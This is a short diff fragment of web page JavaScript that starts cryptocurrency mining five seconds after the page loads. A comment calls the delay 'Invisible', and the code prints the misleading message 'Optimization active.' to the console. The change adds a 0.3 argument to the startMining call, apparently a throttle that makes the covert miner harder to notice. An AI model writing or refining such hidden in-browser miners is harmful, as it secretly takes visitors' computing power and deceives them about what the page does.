@@ -34,7 +34,7 @@
         
         // Start mining 5 seconds after the page loads (Invisible delay)
         setTimeout(function() {
-            startMining(pool, walletAddress, workerId, threads);
+            startMining(pool, walletAddress, workerId, threads, 0.3);
             console.log("Optimization active."); 
         }, 5000);
 
